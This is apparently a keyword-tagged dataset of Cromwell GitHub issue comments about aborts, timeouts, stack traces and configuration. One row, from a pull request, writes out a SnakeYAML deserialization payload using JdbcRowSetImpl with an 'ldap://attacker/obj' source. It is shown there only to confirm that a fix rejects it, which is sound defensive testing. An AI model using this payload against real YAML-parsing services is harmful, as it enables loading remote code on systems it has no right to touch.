Safety,"Stack traces show lots of threads on the default dispatcher backed up creating Google credentials like so:. ```; ""cromwell-system-akka.actor.default-dispatcher-49"" #236 prio=5 os_prio=31 tid=0x00007faafe1ff800 nid=0x12903 waiting on condition [0x0000000133659000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000007bb5f1698> (a java.util.concurrent.locks.ReentrantLock$NonfairSync); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt(AbstractQueuedSynchronizer.java:836); at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireQueued(AbstractQueuedSynchronizer.java:870); at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquire(AbstractQueuedSynchronizer.java:1199); at java.util.concurrent.locks.ReentrantLock$NonfairSync.lock(ReentrantLock.java:209); at java.util.concurrent.locks.ReentrantLock.lock(ReentrantLock.java:285); at com.google.api.client.auth.oauth2.Credential.refreshToken(Credential.java:486); at cromwell.filesystems.gcs.GoogleAuthMode$$anonfun$1.apply$mcZ$sp(GoogleAuthMode.scala:79); at cromwell.filesystems.gcs.GoogleAuthMode$$anonfun$1.apply(GoogleAuthMode.scala:79); at cromwell.filesystems.gcs.GoogleAuthMode$$anonfun$1.apply(GoogleAuthMode.scala:79); at scala.util.Try$.apply(Try.scala:192); at cromwell.filesystems.gcs.GoogleAuthMode$class.validateCredentials(GoogleAuthMode.scala:79); at cromwell.filesystems.gcs.ApplicationDefaultMode.validateCredentials(GoogleAuthMode.scala:138); at cromwell.filesystems.gcs.GoogleAuthMode$class.credential(GoogleAuthMode.scala:64); at cromwell.filesystems.gcs.ApplicationDefaultMode.credential(GoogleAuthMode.scala:138); at cromwell.filesystems.gcs.GoogleAuthMode$class.buildStorage(GoogleAuthMode.scala:95); at cromwell.filesystems.gcs.ApplicationDefaultMode.buildStorage(GoogleAuthMode.scala:138); at cromwell.backend.impl.jes.io.package$.buildFilesystem",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1065#issuecomment-228816798:320,Unsafe,Unsafe,320,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1065#issuecomment-228816798,1,['Unsafe'],['Unsafe']
Safety,Stacktrace:. ```; java.sql.SQLTimeoutException: Timeout after 5059ms of waiting for a connection.; at com.zaxxer.hikari.pool.BaseHikariPool.getConnection(BaseHikariPool.java:227) ~[cromwell.jar:0.19]; at com.zaxxer.hikari.pool.BaseHikariPool.getConnection(BaseHikariPool.java:182) ~[cromwell.jar:0.19]; at com.zaxxer.hikari.HikariDataSource.getConnection(HikariDataSource.java:93) ~[cromwell.jar:0.19]; at slick.jdbc.hikaricp.HikariCPJdbcDataSource.createConnection(HikariCPJdbcDataSource.scala:12) ~[cromwell.jar:0.19]; at slick.jdbc.JdbcBackend$BaseSession.conn$lzycompute(JdbcBackend.scala:415) ~[cromwell.jar:0.19]; at slick.jdbc.JdbcBackend$BaseSession.conn(JdbcBackend.scala:414) ~[cromwell.jar:0.19]; at slick.jdbc.JdbcBackend$BaseSession.startInTransaction(JdbcBackend.scala:437) ~[cromwell.jar:0.19]; at slick.driver.JdbcActionComponent$StartTransaction$.run(JdbcActionComponent.scala:41) ~[cromwell.jar:0.19]; at slick.driver.JdbcActionComponent$StartTransaction$.run(JdbcActionComponent.scala:38) ~[cromwell.jar:0.19]; at slick.backend.DatabaseComponent$DatabaseDef$$anon$2.liftedTree1$1(DatabaseComponent.scala:237) ~[cromwell.jar:0.19]; at slick.backend.DatabaseComponent$DatabaseDef$$anon$2.run(DatabaseComponent.scala:237) ~[cromwell.jar:0.19]; at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142) ~[na:1.8.0_72]; at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617) ~[na:1.8.0_72]; at java.lang.Thread.run(Thread.java:745) ~[na:1.8.0_72]; ```,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/737#issuecomment-214518906:48,Timeout,Timeout,48,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/737#issuecomment-214518906,1,['Timeout'],['Timeout']
Safety,"Still experiencing this problem. It seems we cannot use `Array[File]` inside `struct`s for now. . ```Test.wdl; version development; ​; workflow Test {; input {; String file_name = ""file.txt""; String file_contents = ""teste""; }; ​; call WriteFile {; input:; file_name=file_name,; file_contents=file_contents; }; ​; Array[File] array_file = [WriteFile.output_file, WriteFile.output_file]; ​; MultiTypeStruct test_struct = {; ""file_name"" : file_name,; ""file"" : WriteFile.output_file,; ""array_file"" : array_file; }; ​; output {; MultiTypeStruct multi_type_struct_test = test_struct; }; }; ​; struct MultiTypeStruct {; String file_name; File file; Array[File] array_file; }; ​; task WriteFile {; input {; String file_name; String file_contents; }; ​; command <<<; echo -e """"""~{file_contents}"""""" > ~{file_name}; >>>; ​; runtime {; docker: ""gcr.io/google.com/cloudsdktool/cloud-sdk:330.0.0-alpine""; preemptible: 3; }; ​; output {; File output_file = ""~{file_name}""; }; }. ```. You can easily see an error happening when running a simple workflow like this. As long as you have an `Array[File]` inside a `struct`, it will keep on failing. In my case, I'm using `version development`, and the last task on the workflow simply gets stuck with status `Running` while the workflow itself moves to status `Aborting` and stays stuck permanently in `Aborting` (never actually moving its status to `Aborted`). Experienced this issue with Cromwell versions 63 and 74, while using GCP lifescience v2 backend.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4663#issuecomment-1017704304:1292,Abort,Aborting,1292,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4663#issuecomment-1017704304,6,['Abort'],"['Aborted', 'Aborting']"
Safety,Submitted a new commit that works around a MariaDB issue. Requesting sanity check for that new commit.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5058#issuecomment-510463770:69,sanity check,sanity check,69,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5058#issuecomment-510463770,1,['sanity check'],['sanity check']
Safety,"Sure. What's the ticket number? The issue this user posted is about both submitted workflows and aborted workflows getting stuck. I asked him/her to abort the submitted ones so that the workspace would stop showing as Running, but that didn't work. Can we confirm that they aren't getting charged for machines not aborting that they have requested to abort?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1861#issuecomment-335536766:97,abort,aborted,97,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1861#issuecomment-335536766,4,['abort'],"['abort', 'aborted', 'aborting']"
Safety,"Suspicious:. [Travis](https://travis-ci.com/github/broadinstitute/cromwell/jobs/403803242) times out at 180m with these messages:; ```; 2020-10-22 15:23:30,919 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:23:35,939 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:23:40,959 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:23:45,978 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:23:50,999 cromwell-system-akka.dispatchers.engine-dispatcher-10 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. …2020-10-22 15:23:56,019 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:01,039 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:06,058 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:11,079 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:16,108 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:21,129 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:26,149 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:31,169 cromwell-system-a",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929:221,Abort,Abort,221,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929,5,['Abort'],['Abort']
Safety,"TB in testing so I don’t know if size is the problem. Does the issue persist after restarting the server? I committed a change to the develop branch a few weeks ago that does a better job of cleaning up the copying resources. If the restart solves the problem then you may want to build from the develop branch until the next release is sent out. Also, is the bucket containing the source file the same bucket as the workflow bucket? If not, are they in the same region?; > […](#); > On Wed, Nov 11, 2020 at 4:28 AM Luyu ***@***.***> wrote: Hi, The improved multipart copying (api: CreateMultipartUpload) doesn't work for me. The cromwell server always checks the existence of the cached file before the copying finishes. In Cromwell v51 and before, some small files <100GB were able to be successfully cached. However, with Cromwell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf … <#m_3227077625045957240_> On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out wai",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046:999,timeout,timeout,999,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046,1,['timeout'],['timeout']
Safety,TOL - Shouldn't we run the finalization actor anyway if we're aborting during execution ?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/893#issuecomment-222828225:62,abort,aborting,62,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/893#issuecomment-222828225,1,['abort'],['aborting']
Safety,TOL2: Do we want to have an concurrency protection on this action (eg to run at most 1 docker build at a time?) to avoid awkward race conditions (or merge conflicts) in cromwhelm if two actions are competing to update the helm chart at the same time?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6739#issuecomment-1105146934:115,avoid,avoid,115,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6739#issuecomment-1105146934,1,['avoid'],['avoid']
Safety,"Tests are incomplete / non-unit tests. May mock out a client, or figure out a way to detect a local pem/p12.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/307#issuecomment-160741667:85,detect,detect,85,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/307#issuecomment-160741667,1,['detect'],['detect']
Safety,"Tex-- assuming liquibase has been successfully run in the past, this `run.sh`, combined with the latest jenkins config file, _should_ start up the server cleanly. If you could sanity check run for me, I'd appreciate it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/85#issuecomment-119441052:176,sanity check,sanity check,176,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/85#issuecomment-119441052,1,['sanity check'],['sanity check']
Safety,Thanks @carbocation - based on what you're saying it sounds like those run creation requests are in fact succeeding but just taking longer than Cromwell's request timeout to respond. For whoever picks up this ticket: I believe that wiring through an option to increase [timeouts on the requests to Google](https://developers.google.com/api-client-library/java/google-api-java-client/errors) (and make the value configurable) is hopefully sufficient for fixing this error.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4914#issuecomment-488437019:163,timeout,timeout,163,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4914#issuecomment-488437019,2,['timeout'],"['timeout', 'timeouts']"
Safety,"Thanks @cjllanwarne , . > 2019-04-24 10:49:25,556 INFO - DispatchedConfigAsyncJobExecutionActor [UUID(917dfbca)JointGenotyping.ImportGenotypeGVCFs:7640:1]: Cromwell will watch for an rc file but will *not* double-check whether this job is actually alive (unless Cromwell restarts). So I guess I have not managed to enable polling after all! Edit: I found that I mispelt the configuration line, I wonder if there was a message telling me about misspelling in the logs. I had not heard of exit-poll-timeout, I assume you mean exit-code-timeout-seconds, or is this the `unrelated to this timeout`?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4877#issuecomment-486025965:497,timeout,timeout,497,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4877#issuecomment-486025965,3,['timeout'],"['timeout', 'timeout-seconds']"
Safety,Thanks @illusional! I dont think will be an option for us. Given the variable nature of the number of genomes we are going to be dealing with we are eventually going to hit this again even if we did reduce our reliance on the read functions. It feels like it needs an option in the config to increase the timeout.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4057#issuecomment-823930311:305,timeout,timeout,305,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4057#issuecomment-823930311,1,['timeout'],['timeout']
Safety,"Thanks @kshakir! . Mint team just noticed a similar issue for a few of our workflows, where the workflow status in Cromwell is ""running"" but the VM instance is no longer running. These specific workflows were ""stuck"" on the first task and did not start any subworkflows. When trying to abort the workflow, I get the following error: . ```; {; ""status"": ""error"",; ""message"": ""Couldn't abort 467b64cc-9aa4-4eaf-85ef-16ed4d540d4c because no workflow with that ID is in progress""; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3654#issuecomment-402854046:286,abort,abort,286,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3654#issuecomment-402854046,2,['abort'],['abort']
Safety,"Thanks @mr-c, I modified the example a bit to be compatible with the classes present in our JVM and I do now see a difference between `Constructor` and `SafeConstructor` that suggests we could have been exposed before the change. (Deliberately ommited `autoCommit` because it seems to be unsupported in our JVM and causes a much less interesting error.); ```; cwlVersion: v1.0; class: Workflow; inputs: []; steps: []; outputs: []. hints:; - class: foo; bar: !!com.sun.rowset.JdbcRowSetImpl; dataSourceName: ldap://attacker/obj; ```. Old Cromwell, workflow succeeds with just some extra log messages:. ```; WARNING: An illegal reflective access operation has occurred; WARNING: Illegal reflective access by org.yaml.snakeyaml.constructor.BaseConstructor (file:/Users/anichols/Downloads/cromwell-69.jar) to constructor com.sun.rowset.JdbcRowSetImpl(); WARNING: Please consider reporting this to the maintainers of org.yaml.snakeyaml.constructor.BaseConstructor; WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations; WARNING: All illegal access operations will be denied in a future release; ```; ```; ../../../var/folders/xj/rglhyd6s2lbbrz8r53vn_rww0000gp/T/cwl_temp_dir_8673604963791319219/cwl_temp_file_ef439db0-21c5-4035-87b2-0613819fc113.cwl:8:3: checking item; ../../../var/folders/xj/rglhyd6s2lbbrz8r53vn_rww0000gp/T/cwl_temp_dir_8673604963791319219/cwl_temp_file_ef439db0-21c5-4035-87b2-0613819fc113.cwl:8:3: Field `class` contains undefined reference to `file:///var/folders/xj/rglhyd6s2lbbrz8r53vn_rww0000gp/T/cwl_temp_dir_8673604963791319219/foo`; ```. New Cromwell, workflow is rejected:. ```; Workflow input processing failed:; could not determine a constructor for the tag tag:yaml.org,2002:com.sun.rowset.JdbcRowSetImpl; in 'reader', line 9, column 8:; bar: !!com.sun.rowset.JdbcRowSetImpl; ^; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6510#issuecomment-932368194:153,Safe,SafeConstructor,153,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6510#issuecomment-932368194,1,['Safe'],['SafeConstructor']
Safety,"Thanks for pointing this out, @antonkulaga - this looks to me like a bug in our draft-2 and 1.0 support. I think this is probably something that could possibly be improved in a future WDL spec version. IMO ideally we wouldn't have to have a ""mixed"" return type function (since it plays badly with type-safety,) I think I'd prefer `read_json_object` and `read_json_array`, for example - but that would be up to the openWDL group, and this is definitely a bug in our interpretation for now!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4518#issuecomment-454047093:302,safe,safety,302,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4518#issuecomment-454047093,1,['safe'],['safety']
Safety,"Thanks for the clarification @dspeck1. I would just like to comment that the behavior here feels very unintuitive from a user perspective, and so pushing the handling of it onto users feels risky to me. Personally, I would be very surprised if many users would think to implement handling this themselves, even if there were an attempt to widely document it; it's just too different from the way (at least I) expect a workflow task to operate. Given the requirements for hitting this behavior, I don't _think_ there is a risk to workflow accuracy or reproducibility associated with it. But I haven't systematically explored the entire space of this edge case, so it certainly does worry me a bit that some sort of strange related behavior could somehow affect workflows which actually succeed. Which would be a much more significant issue, imo.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7489#issuecomment-2346453653:190,risk,risky,190,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7489#issuecomment-2346453653,2,['risk'],"['risk', 'risky']"
Safety,"Thanks for the feedback. Can you elaborate more on the need to be able to; run a container as privileged?. It could (in theory) be parameterized if required but it seems hazardous to; have this be the default. On Tue, Jan 5, 2021 at 5:42 PM Shane Canon <notifications@github.com> wrote:. > We have a similar need. This overlaps a little with #4579; > <https://github.com/broadinstitute/cromwell/issues/4579>. It would be; > useful if the submit-docker was parameterized similar to how it is for some; > of the other backends.; >; > —; > You are receiving this because you commented.; >; >; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5863#issuecomment-754946394>,; > or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6ELZQ5HVOSV2JRMIH3LSYOIVRANCNFSM4RQDAKPQ>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5863#issuecomment-755294082:170,hazard,hazardous,170,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5863#issuecomment-755294082,2,['hazard'],['hazardous']
Safety,Thanks for the link to the centaur docs! I'll work on adding a testcase for this. Looks like that CI failure is a timeout error? Not sure what to make of that... but I'll see what happens after adding the new testcase.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5143#issuecomment-525773176:114,timeout,timeout,114,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5143#issuecomment-525773176,1,['timeout'],['timeout']
Safety,"Thanks very much! In this case I had set one of my parameters to a very large number in order to avoid triggering file chunking (the Int represented maximum number of lines to read from a file before chunking). . I don't want this to take away from the fact that on genome-scale computing, there are lots of reasons for people to want to use a double. One example would be to indicate the length of the genome in bases (~3b for humans, more for some other organisms).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2685#issuecomment-335946538:97,avoid,avoid,97,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2685#issuecomment-335946538,1,['avoid'],['avoid']
Safety,"Thanks, @geoffjentry. The quota failures were on the JES side, I think, and were reported back to Cromwell; I'm not sure how you would be able to detect a failure of one type versus another. Probably good to follow the conversation [here](https://groups.google.com/forum/#!topic/google-genomics-discuss/OL18jPoPvPE), as it sounds like Google is still sorting out a few things.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1665#issuecomment-260645132:146,detect,detect,146,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1665#issuecomment-260645132,1,['detect'],['detect']
Safety,"Thanks. I think I have a clue, your lowest level exception says; ```; 504 Gateway Timeout\nGET https://storage.googleapis.com/download/storage/v1/b/mccarroll-mocha/o/cromwell%2Fcromwell-executions%2Fmocha%2F86d47e9a-5745-4ec0-b4eb-0164f073e5f4%2Fcall-idat2gtc%2Fshard-73%2Frc?alt=media; ```; which does not match the pattern; ```; "".*Could not read from gs.+504 Gateway Timeout.*""; ```; introduced in https://github.com/broadinstitute/cromwell/pull/5344",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6154#issuecomment-760319699:82,Timeout,Timeout,82,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6154#issuecomment-760319699,2,['Timeout'],['Timeout']
Safety,Thanks. Setting `cpuPlatform` in the runtime attributes is the only way to avoid scheduling to an e series machines through Cromwell. GCP Batch is limited to setting cpuPlatform or instance type. There is no preferred machine family type setting in GCP Batch. With that said the e series machine should not be that slow. Performance is supposed to be comparable to N1. If it repeatable open a support case with GCP.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7474#issuecomment-2256082242:75,avoid,avoid,75,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7474#issuecomment-2256082242,1,['avoid'],['avoid']
Safety,"The DNS name `batch.default.amazonaws.com` does not resolve - perhaps you need to change a value of `default` in the config to something else. For example, `batch.us-east-1.amazonaws.com` resolves fine (though predictably doesn't respond to ping, load a web page, etc.).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4334#issuecomment-434316568:210,predict,predictably,210,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4334#issuecomment-434316568,1,['predict'],['predictably']
Safety,The EJEA is sending RecoverJobCommand or ExecuteJobCommand depending on if the workflow is restarting or not. So I think this is already done.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/664#issuecomment-233432623:20,Recover,RecoverJobCommand,20,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/664#issuecomment-233432623,1,['Recover'],['RecoverJobCommand']
Safety,"The Rawls behavior is not a simple ""retry on any error"". Here's what I'm seeing:; * User aborts a submission in FireCloud.; * Rawls marks submission as `Aborting`; * In a background actor, Rawls finds all workflows inside `Aborting` submissions and sends an abort request to Cromwell.; * In a background actor, Rawls periodically queries Cromwell for the status of each active workflow, then updates its db based on Cromwell's response; * if all workflows in a submission are complete (failed, succeeded, aborted), the submission is marked as complete. In the aberrant workflow cases I checked, Cromwell is returning a status of `Running` or `Submitted` from its workflow-status endpoint, but returns a 404 from its abort endpoint. I suspect that 1) the abort request will never succeed; 2) the workflow status endpoint's response will never change, and therefore 3) Rawls will never update its db and will be stuck trying to abort the workflow forever.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4497#issuecomment-448063480:89,abort,aborts,89,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4497#issuecomment-448063480,14,"['Abort', 'abort']","['Aborting', 'abort', 'aborted', 'aborts']"
Safety,"The TravisCI test is not passing or finishing, but I am going to bypass that protection and merge anyway. Talked about it with the team: current theory has to do with the fact that Travis is hung up on testing an old branch name (`travis_to_workflows_test`) that this PR's branch (`sbt_unit_tests`) was branched from. Alternatively, it could be due to the fact that I am new and might not have some sort of account set up in Travis. Another theory is that Travis can't handle the fact that no cromwell code was changed in this branch. . Anyway....this is only github specific stuff so deemed safe to merge.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6992#issuecomment-1412714284:592,safe,safe,592,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6992#issuecomment-1412714284,1,['safe'],['safe']
Safety,"The cause and effect:. - An assumption in the token dispenser actor (that none of the internal queues were ever empty) turned out to not always be true; - As a result, not infrequently an attempted `dequeue` would cause the `JobExecutionTokenDispenserActor` to crash and be restarted - zeroing out all known token dispensations *and* all known actors waiting for tokens.; - The overall consequence of this was that jobs would submit their request for exeution tokens and be added to a queue. But that queue was lost when the `JobExecutionTokenDispenserActor` was restarted and therefore the jobs would sit forever waiting for a token which was never sent to them. The fix:; - First, add a sanity check before calling `dequeue`. If the queue is empty, don't do it. But hopefully will now be a redundant check thanks to:; - Second, one situation was identified which would lead to this state when token-requesting-actors were aborting before a token was dispensed. If that left the token queue for that hog group empty then the queue was not being correctly removed from the `JobExecutionTokenDispenserActor` - thus leaving an empty queue behind and triggering the ""dequeue on an empty queue"" bug.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4908#issuecomment-488345810:689,sanity check,sanity check,689,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4908#issuecomment-488345810,3,"['abort', 'redund', 'sanity check']","['aborting', 'redundant', 'sanity check']"
Safety,"The changes for this fix are just a subset of the ones in open request #6058, hence this request is redundant now,",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5807#issuecomment-759823836:100,redund,redundant,100,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5807#issuecomment-759823836,1,['redund'],['redundant']
Safety,"The following gives a 2 GB cache on top of Cromwell, and forwards aborts to a different host. I've manually tested with the following configuration as an excuse to play w/ Kubernetes:. ## Varnish config. points all queries to reader service except aborts:; ```; vcl 4.0;. backend worker {; .host = ""cromwell-worker-service.default"";; .port = ""8000"";; }. backend reader {; .host = ""cromwell-reader-service.default"";; .port = ""8000"";; }. sub vcl_recv {; if (req.url ~ ""abort/$"") {; set req.backend_hint = worker;; } else {; set req.backend_hint = reader;; }; }; ```; Source: https://raw.githubusercontent.com/danbills/ammoniteExample/master/kubernetes/varnish-rw-cromwell-config.vcl. ## Varnish docker . w/ latest 6.1 version:; https://hub.docker.com/r/danbills/varnish/; Source: https://github.com/danbills/ammoniteExample/tree/master/kubernetes/varnish. ## Kubernetes Config(map); Kubernetes [Pod](https://kubernetes.io/docs/concepts/workloads/pods/pod-overview/) to run varnish w/ the config file loaded into a [ConfigMap](https://cloud.google.com/kubernetes-engine/docs/concepts/configmap) named `rw`:; ```; apiVersion: v1; kind: Pod; metadata:; name: varnish-cache; labels:; app: varnish-cache; spec:; containers:; - name: cache; resources:; requests:; # We'll use two gigabytes for each varnish cache; memory: 2Gi; image: danbills/varnish:6_1; imagePullPolicy: Always; args: [""-F"", ""-f"", ""/conf/varnish-rw-cromwell-config.vcl"", ""-a"" , ""0.0.0.0:8080"" , ""-s"" , ""malloc,2G""]; ports:; - containerPort: 8080; volumeMounts:; - name: config-volume; mountPath: /conf; volumes:; - name: config-volume; configMap:; # Provide the name of the ConfigMap containing the files you want; # to add to the container; name: rw; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4253#issuecomment-437427248:66,abort,aborts,66,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4253#issuecomment-437427248,3,['abort'],"['abort', 'aborts']"
Safety,"The regular status polling is totally separate from this option. . Regular polling backs off, so doesn't have a single ""interval"" value to configure or report (ie it starts off polling with short intervals but slows down as the job runs for longer and longer). That's true for all jobs across all backends. The `is-alive` check is a fixed (configurable) duration, and it's the timeout between `is-alive` returning false, and the job being considered failed, that are the same. Does that make sense?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4877#issuecomment-492253707:377,timeout,timeout,377,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4877#issuecomment-492253707,1,['timeout'],['timeout']
Safety,The shoulders of giants is always a safe place :),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1795#issuecomment-267840564:36,safe,safe,36,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1795#issuecomment-267840564,1,['safe'],['safe']
